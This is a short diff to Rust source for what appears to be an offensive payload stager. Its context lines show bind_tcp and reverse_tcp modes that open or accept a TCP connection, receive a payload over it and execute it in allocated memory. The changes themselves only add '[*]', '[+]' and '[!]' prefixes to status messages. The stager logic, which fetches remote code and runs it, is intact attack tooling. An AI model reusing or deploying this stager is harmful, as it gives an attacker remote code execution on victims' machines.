@@ -11,7 +11,7 @@ pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
         // Start a bind_tcp stager
         true => {
             let addr = format!("0.0.0.0{addr}");
-            println!("Using bind_tcp stager ({addr})");
+            println!("[*] Using bind_tcp stager ({addr})");
             let listener = TcpListener::bind(&addr)?;
             let (stream, _) = listener.accept()?;
             stream
@@ -19,13 +19,14 @@ pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
 
         // Start a reverse_tcp stager
         false => {
-            println!("Using reverse_tcp stager ({addr})");
+            println!("[*] Using reverse_tcp stager ({addr})");
             TcpStream::connect(&addr)?
         }
     };
 
     // Receive and execute the payload
     let payload = payload_recv(&stream)?;
+    println!("[+] Payload received!");
     payload_exec(payload);
 
     Ok(())
@@ -68,7 +69,7 @@ fn payload_exec(payload: Vec<u8>) {
         )
     };
     if ptr.is_null() {
-        eprintln!("Error: Failed to allocate memory for payload");
+        eprintln!("[!] Error: Failed to allocate memory for payload");
         return;
     }
 
